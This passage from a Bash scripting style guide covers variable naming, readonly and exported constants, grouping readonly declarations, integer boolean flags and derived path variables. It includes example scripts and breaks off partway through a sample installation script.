| Type | Convention | Example |
|------|------------|---------|
| Constants | UPPER_CASE | `readonly MAX_RETRIES=3` |
| Global variables | UPPER_CASE or CamelCase | `VERBOSE=1` or `ConfigFile='/etc/app.conf'` |
| Local variables | lower_case with underscores | `local file_count=0` |
|  | CamelCase acceptable for important locals | `local ConfigData` |
| Internal/private functions | prefix with _ | `_validate_input()` |
| Environment variables | UPPER_CASE with underscores | `export DATABASE_URL` |

**Examples:**
```bash
# Constants
readonly -- SCRIPT_VERSION='1.0.0'
readonly -- MAX_CONNECTIONS=100

# Global variables
declare -i VERBOSE=1
declare -- ConfigFile='/etc/myapp.conf'

# Local variables
process_data() {
  local -i line_count=0
  local -- temp_file
  local -- CurrentSection  # CamelCase for important variable
}

# Private functions
_internal_helper() {
  # Used only by other functions in this script
}
```

**Rationale:**
- **UPPER_CASE for globals/constants**: Immediately visible as script-wide scope, matches shell conventions
- **lower_case for locals**: Distinguishes from globals, prevents accidental shadowing
- **Underscore prefix for private functions**: Signals "internal use only", prevents namespace conflicts
- **Avoid lowercase single-letter names**: Reserved for shell (`a`, `b`, `n`, etc.)
- **Avoid all-caps shell variables**: Don't use `PATH`, `HOME`, `USER`, etc. as your variable names


---


**Rule: BCS0204**

### Constants and Environment Variables

**Constants (readonly):**
```bash
# Use readonly for values that never change
readonly -- SCRIPT_VERSION='1.0.0'
readonly -- MAX_RETRIES=3
readonly -- CONFIG_DIR='/etc/myapp'

# Group readonly declarations
VERSION='1.0.0'
AUTHOR='John Doe'
LICENSE='MIT'
readonly -- VERSION AUTHOR LICENSE
```

**Environment variables (export):**
```bash
# Use declare -x (or export) for variables passed to child processes
declare -x ORACLE_SID='PROD'
declare -x DATABASE_URL='postgresql://localhost/mydb'

# Alternative syntax
export LOG_LEVEL='DEBUG'
export TEMP_DIR='/tmp/myapp'
```

**Rationale:**

**When to use `readonly`:**
- **Script metadata** that never changes (VERSION, AUTHOR, LICENSE)
- **Configuration paths** determined at startup (CONFIG_DIR, DATA_DIR)
- **Constants derived from calculations** that shouldn't be modified later
- **Purpose**: Prevent accidental modification, signal intent to readers

**When to use `declare -x` / `export`:**
- **Values needed by child processes** (commands executed by script)
- **Environment configuration** for tools (DATABASE_URL, API_KEY)
- **Settings inherited by subshells** (LOG_LEVEL, DEBUG_MODE)
- **Purpose**: Make variable available in subprocess environment

**Key differences:**

| Feature | `readonly` | `declare -x` / `export` |
|---------|-----------|------------------------|
| Prevents modification | ✓ Yes | ✗ No |
| Available in subprocesses | ✗ No | ✓ Yes |
| Can be changed later | ✗ Never | ✓ Yes |
| Use case | Constants | Environment config |

**Combining both (readonly + export):**
```bash
# Make a constant that is also exported to child processes
declare -rx BUILD_ENV='production'
readonly -x MAX_CONNECTIONS=100

# Or in two steps
declare -x DATABASE_URL='postgresql://prod-db/app'
readonly -- DATABASE_URL
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - exporting constants unnecessarily
export MAX_RETRIES=3  # Child processes don't need this

# ✓ Correct - only make it readonly
readonly -- MAX_RETRIES=3

# ✗ Wrong - not making true constants readonly
CONFIG_FILE='/etc/app.conf'  # Could be accidentally modified later

# ✓ Correct - protect against modification
readonly -- CONFIG_FILE='/etc/app.conf'

# ✗ Wrong - making user-configurable variables readonly too early
readonly -- OUTPUT_DIR="$HOME/output"  # Can't be overridden by user!

# ✓ Correct - allow override, then make readonly
OUTPUT_DIR="${OUTPUT_DIR:-$HOME/output}"
readonly -- OUTPUT_DIR
```

**Example combining both:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Script constants (not exported)
readonly -- SCRIPT_VERSION='2.1.0'
readonly -- MAX_FILE_SIZE=$((100 * 1024 * 1024))  # 100MB

# Environment variables for child processes (exported)
declare -x LOG_LEVEL="${LOG_LEVEL:-INFO}"
declare -x TEMP_DIR="${TMPDIR:-/tmp}"

# Combined: readonly + exported
declare -rx BUILD_ENV='production'

# Derived constants (readonly)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```


---


**Rule: BCS0205**

### Readonly After Group

**When declaring multiple readonly variables, always declare them first with their values, then make them all readonly in a single statement. This pattern improves readability, prevents assignment errors, and makes the immutability contract explicit and visible.**

**Rationale:**

- **Prevents Assignment Errors**: Cannot assign value to an already-readonly variable
- **Visual Grouping**: Related constants are visually grouped together as a logical unit
- **Clear Intent**: Single readonly statement makes immutability contract obvious
- **Maintainability**: Easy to add/remove variables from the readonly group
- **Readability**: Separates initialization phase (values) from protection phase (readonly)
- **Error Detection**: If any variable hasn't been initialized before readonly, script fails explicitly

**Standard pattern:**

```bash
# Script metadata
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Why this pattern works:**

\`\`\`bash
# Phase 1: Initialize all variables
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# Phase 2: Protect entire group
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Now all four variables are immutable
\`\`\`

**What groups belong together:**

**1. Script metadata group:**
\`\`\`bash
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
\`\`\`

**2. Color definitions group:**
\`\`\`bash
# Terminal colors (conditional)
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  BOLD=$'\033[1m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  YELLOW=''
  CYAN=''
  BOLD=''
  NC=''
fi
readonly -- RED GREEN YELLOW CYAN BOLD NC
\`\`\`

**3. Path constants group:**
\`\`\`bash
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"
SHARE_DIR="$PREFIX/share/myapp"
LIB_DIR="$PREFIX/lib/myapp"
ETC_DIR="$PREFIX/etc/myapp"
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR
\`\`\`

**4. Configuration defaults group:**
\`\`\`bash
DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
DEFAULT_LOG_LEVEL='info'
DEFAULT_PORT=8080
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES DEFAULT_LOG_LEVEL DEFAULT_PORT
\`\`\`

**Complete example:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# ============================================================================
# Script Metadata (Group 1)
# ============================================================================

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Color Definitions (Group 2)
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  YELLOW=''
  CYAN=''
  NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC

# ============================================================================
# Installation Paths (Group 3)
# ============================================================================

PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"
SHARE_DIR="$PREFIX/share/$SCRIPT_NAME"
readonly -- PREFIX BIN_DIR SHARE_DIR

# ============================================================================
# Configuration (Group 4)
# ============================================================================

DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
MAX_FILE_SIZE=104857600  # 100MB
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES MAX_FILE_SIZE

# ============================================================================
# Mutable Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i ERROR_COUNT=0

# These will be made readonly after argument parsing
declare -- LOG_FILE=''
declare -- CONFIG_FILE=''

# Main logic
main() {
  # Parse arguments...
  # After parsing, make parsed values readonly
  [[ -n "$LOG_FILE" ]] && readonly -- LOG_FILE
  [[ -n "$CONFIG_FILE" ]] && readonly -- CONFIG_FILE

  info "Starting $SCRIPT_NAME $VERSION"
}

main "$@"

#fin
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - making each variable readonly individually
readonly VERSION='1.0.0'
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly SCRIPT_NAME=${SCRIPT_PATH##*/}

# Problems:
# 1. If SCRIPT_PATH assignment fails, you can't see which variable it is
# 2. If SCRIPT_DIR depends on SCRIPT_PATH, but SCRIPT_PATH is readonly,
#    you can't reassign SCRIPT_PATH even temporarily
# 3. Visually cluttered - readonly keyword repeated

# ✓ Correct - initialize all, then make readonly as group
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✗ Wrong - making readonly before all values are set
VERSION='1.0.0'
readonly -- VERSION  # Premature!
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}

# If SCRIPT_PATH assignment fails, VERSION is readonly but
# SCRIPT_DIR is not, creating inconsistent protection

# ✓ Correct - all values set, then all readonly
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR

# ✗ Wrong - forgetting -- separator
readonly VERSION SCRIPT_PATH  # Risky if variable name starts with -

# ✓ Correct - always use -- separator
readonly -- VERSION SCRIPT_PATH

# ✗ Wrong - mixing related and unrelated variables
CONFIG_FILE='config.conf'
VERBOSE=1
SCRIPT_PATH=$(realpath -- "$0")
readonly -- CONFIG_FILE VERBOSE SCRIPT_PATH
# These don't form a logical group!

# ✓ Correct - group logically related variables
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

CONFIG_FILE='config.conf'
LOG_FILE='app.log'
readonly -- CONFIG_FILE LOG_FILE

# ✗ Wrong - readonly inside conditional (hard to verify)
if [[ -f config.conf ]]; then
  CONFIG_FILE='config.conf'
  readonly -- CONFIG_FILE
fi
# CONFIG_FILE might not be readonly if condition is false!

# ✓ Correct - initialize with default, then readonly
CONFIG_FILE="${CONFIG_FILE:-config.conf}"
readonly -- CONFIG_FILE
# Always readonly, value might vary
\`\`\`

**Edge case: Derived variables:**

When variables depend on each other, initialize in dependency order:

\`\`\`bash
# Base configuration
PREFIX="${PREFIX:-/usr/local}"

# Derived paths (depend on PREFIX)
BIN_DIR="$PREFIX/bin"
SHARE_DIR="$PREFIX/share"
LIB_DIR="$PREFIX/lib"

# Make all readonly together
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR

# If you need to recalculate derived values:
# Don't make them readonly until after all calculations
\`\`\`

**Edge case: Conditional initialization:**

\`\`\`bash
# Color constants depend on terminal detection
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  NC=''
fi

# Either way, same variables are defined
# Safe to make readonly after conditional
readonly -- RED GREEN NC
\`\`\`

**Edge case: Arrays in readonly groups:**

\`\`\`bash
# Can make arrays readonly too
declare -a REQUIRED_COMMANDS=('git' 'make' 'tar')
declare -a OPTIONAL_COMMANDS=('md2ansi' 'pandoc')

# Make both arrays readonly
readonly -a REQUIRED_COMMANDS OPTIONAL_COMMANDS

# Or use -- if not specifying type
readonly -- REQUIRED_COMMANDS OPTIONAL_COMMANDS
\`\`\`

**Edge case: Delayed readonly (after argument parsing):**

Some variables can only be made readonly after argument parsing:

\`\`\`bash
#!/bin/bash
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Mutable flags (will be readonly after parsing)
declare -i VERBOSE=0
declare -i DRY_RUN=0

# Mutable configuration (will be readonly after parsing)
declare -- CONFIG_FILE=''
declare -- LOG_FILE=''

main() {
  # Parse arguments (modifies VERBOSE, DRY_RUN, etc.)
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -c|--config)  noarg "$@"; shift; CONFIG_FILE="$1" ;;
    -l|--log)     noarg "$@"; shift; LOG_FILE="$1" ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  # Now make parsed values readonly
  readonly -- VERBOSE DRY_RUN

  # Optional values: only readonly if set
  [[ -n "$CONFIG_FILE" ]] && readonly -- CONFIG_FILE
  [[ -n "$LOG_FILE" ]] && readonly -- LOG_FILE

  # Rest of script with readonly variables
  ((VERBOSE)) && info 'Verbose mode enabled'
  ((DRY_RUN)) && info 'Dry-run mode enabled'
}

main "$@"

#fin
\`\`\`

**Testing readonly status:**

\`\`\`bash
# Check if variable is readonly
if readonly -p 2>/dev/null | grep -q "VERSION"; then
  echo "VERSION is readonly"
else
  echo "VERSION is not readonly"
fi

# List all readonly variables
readonly -p

# Attempt to modify readonly variable (for testing)
VERSION='2.0.0'  # Will fail: bash: VERSION: readonly variable
\`\`\`

**When NOT to use readonly:**

\`\`\`bash
# Don't make readonly if value will change during script execution
declare -i count=0
# count is modified in loops - don't make readonly

# Don't make readonly if conditional assignment
config_file=''
if [[ -f 'custom.conf' ]]; then
  config_file='custom.conf'
elif [[ -f 'default.conf' ]]; then
  config_file='default.conf'
fi
# config_file might be modified - don't make readonly yet

# Only make readonly when value is final
[[ -n "$config_file" ]] && readonly -- config_file
\`\`\`

**Summary:**

- **Initialize first, readonly second**: Separate value assignment from protection
- **Group related variables**: Make logically related variables readonly together
- **Use visual separation**: Add blank lines or comments between variable groups
- **Always use `--`**: Prevents option injection bugs
- **Make readonly early**: As soon as values are final and won't change
- **Delayed readonly for args**: Make readonly after argument parsing for flags/options
- **Test readonly status**: Use `readonly -p` to verify

**Key principle:** The "readonly after group" pattern makes immutability contracts explicit and visible. By clearly separating initialization from protection, readers immediately understand which variables are constants and which are mutable.


---


**Rule: BCS0206**

### Readonly Declaration
Use `readonly` for constants to prevent accidental modification.

```bash
readonly -a REQUIRED=(pandoc git md2ansi)
#shellcheck disable=SC2155 # acceptable; if realpath fails then we have much bigger problems
readonly -- SCRIPT_PATH="$(realpath -- "$0")"
```


---


**Rule: BCS0207**

### Boolean Flags Pattern

For boolean state tracking, use integer variables with `declare -i`:

```bash
# Boolean flags - declare as integers with explicit initialization
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0
declare -i NON_INTERACTIVE=0
declare -i UNINSTALL=0
declare -i DRY_RUN=0

# Test flags in conditionals using (())
((DRY_RUN)) && info 'Dry-run mode enabled'

if ((INSTALL_BUILTIN)); then
  install_loadable_builtins
fi

# Toggle flags
((VERBOSE)) && VERBOSE=0 || VERBOSE=1

# Set flags from command-line parsing
case $1 in
  --dry-run)    DRY_RUN=1 ;;
  --skip-build) SKIP_BUILD=1 ;;
esac
```

**Guidelines:**
- Use `declare -i` for integer-based boolean flags
- Name flags descriptively in ALL_CAPS (e.g., `DRY_RUN`, `INSTALL_BUILTIN`)
- Initialize explicitly to `0` (false) or `1` (true)
- Test with `((FLAG))` in conditionals (returns true for non-zero, false for zero)
- Avoid mixing boolean flags with integer counters - use separate variables


---


**Rule: BCS0208**

### Derived Variables

**Derived variables are variables computed from other variables, often for paths, configurations, or composite values. Group derived variables together with clear section comments explaining their dependencies. Document special cases or hardcoded values. When base variables can change (especially during argument parsing), remember to update all derived variables. Derived variables reduce duplication and ensure consistency when base values change.**

**Rationale:**

- **DRY Principle**: Single source of truth for base values, derived everywhere else
- **Consistency**: When PREFIX changes, all paths update automatically
- **Maintainability**: One place to change base value, derivations update automatically
- **Clarity**: Section comments make relationships between variables obvious
- **Flexibility**: Easy to customize base values via arguments or environment
- **Documentation**: Explicit derivation shows intent and dependencies
- **Correctness**: Updating derived variables when base changes prevents subtle bugs

**Simple derived variables:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# All paths derived from PREFIX
declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib"
declare -- SHARE_DIR="$PREFIX/share"
declare -- DOC_DIR="$PREFIX/share/doc/$APP_NAME"

# Application-specific derived paths
declare -- CONFIG_DIR="$HOME/.$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"
declare -- CACHE_DIR="$HOME/.cache/$APP_NAME"
declare -- DATA_DIR="$HOME/.local/share/$APP_NAME"

main() {
  echo "Installation prefix: $PREFIX"
  echo "Binaries: $BIN_DIR"
  echo "Libraries: $LIB_DIR"
  echo "Documentation: $DOC_DIR"
}

main "$@"

#fin
```

**Derived paths with environment fallbacks:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- APP_NAME='myapp'

# ============================================================================
# Configuration - Derived from Environment (XDG Base Directory Specification)
# ============================================================================

# XDG_CONFIG_HOME with fallback to $HOME/.config
declare -- CONFIG_BASE="${XDG_CONFIG_HOME:-$HOME/.config}"
declare -- CONFIG_DIR="$CONFIG_BASE/$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"

# XDG_DATA_HOME with fallback to $HOME/.local/share
declare -- DATA_BASE="${XDG_DATA_HOME:-$HOME/.local/share}"
declare -- DATA_DIR="$DATA_BASE/$APP_NAME"

# XDG_STATE_HOME with fallback to $HOME/.local/state (for logs)
declare -- STATE_BASE="${XDG_STATE_HOME:-$HOME/.local/state}"
declare -- LOG_DIR="$STATE_BASE/$APP_NAME"
declare -- LOG_FILE="$LOG_DIR/app.log"

# XDG_CACHE_HOME with fallback to $HOME/.cache
declare -- CACHE_BASE="${XDG_CACHE_HOME:-$HOME/.cache}"
declare -- CACHE_DIR="$CACHE_BASE/$APP_NAME"

main() {
  echo "Configuration: $CONFIG_DIR"
  echo "Data: $DATA_DIR"
  echo "Logs: $LOG_DIR"
  echo "Cache: $CACHE_DIR"
}

main "$@"

#fin
```

**Updating derived variables when base changes:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'

# ============================================================================
# Configuration - Derived Paths (initial values)
# ============================================================================

declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib"
declare -- SHARE_DIR="$PREFIX/share"
declare -- MAN_DIR="$PREFIX/share/man"
declare -- DOC_DIR="$PREFIX/share/doc/$APP_NAME"

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option $1 requires an argument"
  fi
}

# Update all derived paths when PREFIX changes
update_derived_paths() {
  BIN_DIR="$PREFIX/bin"
  LIB_DIR="$PREFIX/lib"
  SHARE_DIR="$PREFIX/share"
  MAN_DIR="$PREFIX/share/man"
  DOC_DIR="$PREFIX/share/doc/$APP_NAME"

  info "Updated paths for PREFIX=$PREFIX"
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do
    case $1 in
      --prefix)
        noarg "$@"
        shift
        PREFIX="$1"
        # IMPORTANT: Update all derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME="$1"
        # DOC_DIR depends on APP_NAME, update it
        DOC_DIR="$PREFIX/share/doc/$APP_NAME"
        ;;

      -h|--help)
        echo 'Usage: script.sh [--prefix PREFIX] [--app-name NAME]'
        return 0
        ;;

      *)
        die 22 "Invalid argument: $1"
        ;;
    esac
    shift
  done

  # Make variables readonly after parsing
  readonly -- PREFIX APP_NAME BIN_DIR LIB_DIR SHARE_DIR MAN_DIR DOC_DIR

  # Display configuration
  info 'Installation Configuration:'
  info "  Prefix: $PREFIX"
  info "  App Name: $APP_NAME"
  info "  Binaries: $BIN_DIR"
  info "  Libraries: $LIB_DIR"
  info "  Documentation: $DOC_DIR"
  info "  Manual Pages: $MAN_DIR"
}

main "$@"

#fin
```

**Complex derivations with multiple dependencies:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- ENVIRONMENT='production'
declare -- REGION='us-east'
declare -- APP_NAME='myapp'
declare -- NAMESPACE='default'

# ============================================================================
# Configuration - Derived Identifiers
# ============================================================================

# Composite identifiers derived from base values
declare -- DEPLOYMENT_ID="$APP_NAME-$ENVIRONMENT-$REGION"
declare -- RESOURCE_PREFIX="$NAMESPACE-$APP_NAME"
declare -- LOG_PREFIX="$ENVIRONMENT/$REGION/$APP_NAME"

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# Paths that depend on environment
declare -- CONFIG_DIR="/etc/$APP_NAME/$ENVIRONMENT"
declare -- LOG_DIR="/var/log/$APP_NAME/$ENVIRONMENT"
declare -- DATA_DIR="/var/lib/$APP_NAME/$ENVIRONMENT"

# Files derived from directories and identifiers
declare -- CONFIG_FILE="$CONFIG_DIR/config-$REGION.conf"
declare -- LOG_FILE="$LOG_DIR/$APP_NAME-$REGION.log"
declare -- PID_FILE="/var/run/$DEPLOYMENT_ID.pid"

# ============================================================================
# Configuration - Derived URLs
# ============================================================================

declare -- API_HOST="api-$ENVIRONMENT.example.com"
declare -- API_URL="https://$API_HOST/v1"
declare -- METRICS_URL="https://metrics-$REGION.example.com/$APP_NAME"

main() {
  info 'Deployment Configuration:'
  info "  Deployment ID: $DEPLOYMENT_ID"
  info "  Resource Prefix: $RESOURCE_PREFIX"
  info "  Config File: $CONFIG_FILE"
  info "  Log File: $LOG_FILE"
  info "  API URL: $API_URL"
  info "  Metrics URL: $METRICS_URL"
}

main "$@"

#fin
```

**Complete example - Configurable installation script:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Global Variables - Base Values
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'
declare -- SYSTEM_USER='myapp'

# ============================================================================
# Global Variables - Derived Installation Paths
# ============================================================================

# Installation directories derived from PREFIX
declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib/$APP_NAME"
declare -- SHARE_DIR="$PREFIX/share/$APP_NAME"
declare -- MAN_DIR="$PREFIX/share/man/man1"
declare -- DOC_DIR="$PREFIX/share/doc/$APP_NAME"

# System directories derived from APP_NAME
declare -- CONFIG_DIR="/etc/$APP_NAME"
declare -- LOG_DIR="/var/log/$APP_NAME"
declare -- DATA_DIR="/var/lib/$APP_NAME"
declare -- RUN_DIR="/var/run/$APP_NAME"

# Files derived from directories
declare -- MAIN_BINARY="$BIN_DIR/$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"
declare -- LOG_FILE="$LOG_DIR/app.log"
declare -- PID_FILE="$RUN_DIR/$APP_NAME.pid"

# Systemd unit file path (hardcoded - doesn't depend on PREFIX)
declare -- SYSTEMD_DIR='/etc/systemd/system'
declare -- SERVICE_FILE="$SYSTEMD_DIR/$APP_NAME.service"

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ⚠" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    debug) prefix+=" ⋯" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option $1 requires an argument"
  fi
}

# Update all derived paths when PREFIX changes
update_derived_paths() {
  debug 'Updating derived paths...'

  # Derived from PREFIX
  BIN_DIR="$PREFIX/bin"
  LIB_DIR="$PREFIX/lib/$APP_NAME"
  SHARE_DIR="$PREFIX/share/$APP_NAME"
  MAN_DIR="$PREFIX/share/man/man1"
  DOC_DIR="$PREFIX/share/doc/$APP_NAME"

  # Derived from APP_NAME (PREFIX-independent)
  CONFIG_DIR="/etc/$APP_NAME"
  LOG_DIR="/var/log/$APP_NAME"
  DATA_DIR="/var/lib/$APP_NAME"
  RUN_DIR="/var/run/$APP_NAME"

  # Derived from directories
  MAIN_BINARY="$BIN_DIR/$APP_NAME"
  CONFIG_FILE="$CONFIG_DIR/config.conf"
  LOG_FILE="$LOG_DIR/app.log"
  PID_FILE="$RUN_DIR/$APP_NAME.pid"
  SERVICE_FILE="$SYSTEMD_DIR/$APP_NAME.service"

  debug "PREFIX: $PREFIX"
  debug "BIN_DIR: $BIN_DIR"
  debug "CONFIG_DIR: $CONFIG_DIR"
}

# ============================================================================
# Installation Functions
# ============================================================================

# Show installation configuration
show_config() {
  info "$APP_NAME v$VERSION Installation Configuration:"
  echo ''
  info 'Installation Prefix:'
  info "  PREFIX: $PREFIX"
  echo ''
  info 'Binary and Library Paths:'
  info "  Binaries: $BIN_DIR"
  info "  Libraries: $LIB_DIR"
  info "  Shared Files: $SHARE_DIR"
  info "  Manual Pages: $MAN_DIR"
  info "  Documentation: $DOC_DIR"
  echo ''
  info 'System Paths:'
  info "  Configuration: $CONFIG_DIR"
  info "  Logs: $LOG_DIR"
  info "  Data: $DATA_DIR"
  info "  Runtime: $RUN_DIR"
  echo ''
  info 'Key Files:'
  info "  Main Binary: $MAIN_BINARY"
  info "  Config File: $CONFIG_FILE"
  info "  Log File: $LOG_FILE"
  info "  PID File: $PID_FILE"
  info "  Service File: $SERVICE_FILE"
  echo ''
  info 'System User:'
  info "  User: $SYSTEM_USER"
}

# Create installation directories
create_directories() {
  local -a directories=(
    "$BIN_DIR"
    "$LIB_DIR"
    "$SHARE_DIR"
    "$MAN_DIR"
    "$DOC_DIR"
    "$CONFIG_DIR"
    "$LOG_DIR"
    "$DATA_DIR"
    "$RUN_DIR"
  )

  local -- dir
  for dir in "${directories[@]}"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create directory: $dir"
    else
      if [[ ! -d "$dir" ]]; then
        debug "Creating directory: $dir"
        mkdir -p "$dir"
      else
        debug "Directory exists: $dir"
      fi
    fi
  done
}

# Install files
install_files() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install files to:'
    info "  Binary: $MAIN_BINARY"
    info "  Config: $CONFIG_FILE"
    info "  Service: $SERVICE_FILE"
  else
    info 'Installing files...'

